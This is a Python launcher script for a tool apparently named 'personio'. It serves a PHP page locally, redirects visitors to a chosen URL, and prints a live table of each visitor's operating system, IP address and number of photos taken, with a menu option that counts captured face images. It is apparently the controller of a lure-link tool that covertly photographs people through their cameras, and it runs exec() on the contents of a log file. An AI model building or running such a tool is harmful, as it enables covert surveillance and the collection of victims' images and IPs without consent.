import os, sys, time
from multiprocessing import Process
from prettytable import PrettyTable
from info.data import *
import json
import requests

os.system('clear || cls')
with open("dist/location.location", 'w') as loca:
    loca.write("https://google.com")
with open("dist/log.log", 'w') as log:
    pass

class A:
    def __call__(self):
        os.system("cd dist && php -S localhost:"+str(ports))
class B:
    def __call__(self):
        while True:
            x = PrettyTable()
            x.field_names = ['os', 'num_photo','ip']
            exec(open('dist/log.log').read())
            print(x)
            time.sleep(1)
            os.system("clear || cls")

with open('info/metadata.json') as data:
    meta = json.load(data)
logo=(f"""\n
┌─┐┌─┐┬─┐┌─┐┌─┐┌┐┌┬┌─┐
├─┘├┤ ├┬┘└─┐│ ││││││ │
┴  └─┘┴└─└─┘└─┘┘└┘┴└─┘
[>] Version     : {meta['version']}
 |--> btc: {meta['donate']['btc']}          
 |--> eth: {meta['donate']['eth']}
 |--> # additional and private tools in my telegram :> #
[>] Telegram    : {meta['telegram']}\n""")
print(logo,"""
[0] Number of photos
[1] Face photo 
[2] Helping
""")
def upd():
    try:
        rqst = requests.get(f"{meta['url']}", timeout=5)
        meta_sc = rqst.status_code
        if meta_sc == 200:
            metadata = rqst.text
            json_data = json.loads(metadata)
            gh_version = json_data['version']
            if (str(gh_version) > meta['version']):
                os.system('clear || cls')
                print(logo)
                print(f'\n[>]New Update Available : {gh_version}')
                print(' |--> Please install     : https://github.com/oldnum/personio')
                print(f'[>]New Update Available : {gh_version}')
                exit()
            else:
                pass
    except Exception as exc:
        print(f'Exception : {str(exc)}')
        exit()
upd()
used = input("num lock: ")
if used=='0':
    try:
        upd()
        os.system('clear || cls')
        print(logo)
        print('The number of photos taken:')
        os.system(' find IMAGE-FACE/. -type f | wc -l')
    except:
        print(f'\n[>]New Update Available : {gh_version}')
        print(' |--> Please install     : https://github.com/oldnum/cardesc')
        print(f'[>]New Update Available : {gh_version}')
        exit()

elif used=='1':
    try:
        ports = int(input("ports: "))
    except:
        ports=8080
    reloc = input("redirect or (enter): ")
    if (reloc == ""):
        pass
    else:
        with open("dist/location.location", 'w') as loca:
            loca.write(reloc)
    a = A()
    b = B()

    p1 = Process(target=a)
    p2 = Process(target=b)
    p1.start()
    p2.start()

    p1.join()
    p2.join()
elif used == '2':
    upd()
    os.system('clear || cls')
    print(logo)
    print(info_help)
    print(f"""# launch\n  python3 person.py\n\n# Helping:\n[>] Telegram    : {meta['telegram']}\n """,dot_info)

    exit()
else:
    os.system("clear || cls")
    print(logo)
    exit()
